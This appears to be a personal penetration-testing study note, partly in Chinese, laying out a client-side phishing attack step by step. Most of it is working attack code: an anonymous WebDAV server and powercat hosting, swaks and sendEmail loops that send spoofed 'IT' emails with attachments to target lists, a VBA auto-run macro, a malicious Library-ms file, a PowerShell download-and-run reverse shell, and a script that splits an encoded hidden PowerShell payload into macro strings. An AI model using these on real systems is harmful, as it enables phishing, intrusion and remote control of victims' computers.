# Organize Attack

create Macros/lib-ms && .lnk/func payload -- [[4. Client-Side Attack#Preparation|Preparation]]⬇️
## 1. Start WebDav
```bash
pip install wsgidav
mkdir /home/ikan/webdav
cp config.Library-ms /home/ikan/webdav
wsgidav  --host=0.0.0.0 --port=80 --auth=anonymous --root /home/ikan/webdav/
```
## 2. Perp Powercat
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python -m http.server 8000
```
## 3. Send Email
### swaks
```bash
$ while read mail; do swaks --to $mail --from IT@targetdomain.com –header "Subject: Credentials / Errors" –body "goto http://attackerIP/" –server x.x.x.x; done < mails.txt

#多目标
swaks -t victim1 -t victim2 ... --from IT@targetdomain.com --header "Subject: Credentials / Errors" –body @body.txt -attach @config.Library-ms --server x.x.x.x --suppress-data -ap

swaks -t $(cat emails | tr '\n' ',' | less) --from IT@targetdomain.com --header "Subject: Credentials / Errors" –body @body.txt -attach @config.Library-ms --server x.x.x.x --suppress-data -ap
```
### sendEmail
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a 
/tmp/malware.pdf

Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

# Preparation
## Office Macros
* 格式保存为.doc/.docm
* Enable Content
![[Pasted image 20240418205808.png]]

### Macros Payload
```vba
Sub AutoOpen()
       MyMacro
   End Sub
   Sub Document_Open()
       MyMacro
   End Sub
   Sub MyMacro()
       Dim Str As String
       '...str...concat...'
       CreateObject("Wscript.Shell").Run Str
   End Sub
```
## Windows LibFile Payload
***仅限单次使用，用完后该配置文件会被自动优化修改，不再具有可移植性。在其他机器上或重启后无法工作***
```xml
<!-- ...文件名：config.Library-ms... -->
<!-- ...Start from next... -->

<?xml version="1.0" encoding="UTF-8"?>
   <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
   <name>@windows.storage.dll,-34582</name>
   <version>6</version>
   <isLibraryPinned>true</isLibraryPinned>
   <iconReference>imageres.dll,-1003</iconReference>
   <templateInfo>
   <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
   </templateInfo>
   <searchConnectorDescriptionList>
   <searchConnectorDescription>
   <isDefaultSaveLocation>true</isDefaultSaveLocation>
   <isSupported>false</isSupported>
   <simpleLocation>
   <url>http://192.168.119.2</url> <!-- 此处 http://<localhost> -->
   </simpleLocation>
   </searchConnectorDescription>
   </searchConnectorDescriptionList>
   </libraryDescription>
```

## Reverse Shell
用于.lnk负载
```bash
IEX (New-Object System.Net.Webclient).DownloadString("http://<IP>/powercat.ps1");powercat -c <IP> -p <PORT> -e powershell
```
## [[File Upload Vulnerablity#Windows Reverse PowerShell|Kali Pwsh Encode Base64]]
用于vba Macros负载
```python
   text = 'powershell.exe -nop -w hidden -e {$Base64_EncodedText}' #填入base64_payload的编码
   n = 50
   
   for i in range(0, len(text), n):
   	print("Str = Str + " + '"' + str[i:i+n] + '"')
   ```
```vba
#...
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    '...'
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "
#...
```
   
